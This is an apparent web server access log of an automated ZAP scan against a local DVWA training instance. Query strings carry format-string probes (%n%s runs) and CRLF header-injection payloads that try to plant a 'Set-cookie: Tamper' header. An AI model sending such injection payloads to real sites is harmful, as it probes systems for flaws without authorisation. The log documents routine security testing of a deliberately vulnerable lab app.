172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /favicon.ico?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /instructions.php?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /instructions.php?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /instructions.php?doc=ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php?query=ZAP HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /instructions.php?doc=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /instructions.php?doc=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php?query=ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /robots.txt?query=ZAP HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /robots.txt?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /robots.txt?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php HTTP/1.1" 302 300 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:49 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php?query=ZAP HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php?query=ZAP HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /sitemap.xml?query=ZAP HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /sitemap.xml?query=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /sitemap.xml?query=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /?query=Set-cookie%3A+Tamper%3D7c22c8c7-c326-4e37-a374-c900213fecce HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /?query=any%0D%0ASet-cookie%3A+Tamper%3D7c22c8c7-c326-4e37-a374-c900213fecce HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /about.php?query=Set-cookie%3A+Tamper%3Dd31fcb0d-f0a9-49fc-b27d-7dc2475d0ea1 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D7c22c8c7-c326-4e37-a374-c900213fecce HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /about.php?query=any%0D%0ASet-cookie%3A+Tamper%3Dd31fcb0d-f0a9-49fc-b27d-7dc2475d0ea1 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /?query=any%0ASet-cookie%3A+Tamper%3D7c22c8c7-c326-4e37-a374-c900213fecce HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /about.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dd31fcb0d-f0a9-49fc-b27d-7dc2475d0ea1 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /?query=any%3F%0ASet-cookie%3A+Tamper%3D7c22c8c7-c326-4e37-a374-c900213fecce HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /about.php?query=any%0ASet-cookie%3A+Tamper%3Dd31fcb0d-f0a9-49fc-b27d-7dc2475d0ea1 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /?query=any%0D%0ASet-cookie%3A+Tamper%3D7c22c8c7-c326-4e37-a374-c900213fecce%0D%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /about.php?query=any%3F%0ASet-cookie%3A+Tamper%3Dd31fcb0d-f0a9-49fc-b27d-7dc2475d0ea1 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D7c22c8c7-c326-4e37-a374-c900213fecce%0D%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /about.php?query=any%0D%0ASet-cookie%3A+Tamper%3Dd31fcb0d-f0a9-49fc-b27d-7dc2475d0ea1%0D%0A HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /about.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dd31fcb0d-f0a9-49fc-b27d-7dc2475d0ea1%0D%0A HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs?query=Set-cookie%3A+Tamper%3D9e8c5636-aa7e-44fe-aa62-e5cf46a00355 HTTP/1.1" 301 652 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs/DVWA_v1.3.pdf?query=Set-cookie%3A+Tamper%3D975d44aa-d9e5-440c-970c-683da9436f78 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs?query=any%0D%0ASet-cookie%3A+Tamper%3D9e8c5636-aa7e-44fe-aa62-e5cf46a00355 HTTP/1.1" 301 670 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D9e8c5636-aa7e-44fe-aa62-e5cf46a00355 HTTP/1.1" 301 676 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs/DVWA_v1.3.pdf?query=any%0D%0ASet-cookie%3A+Tamper%3D975d44aa-d9e5-440c-970c-683da9436f78 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
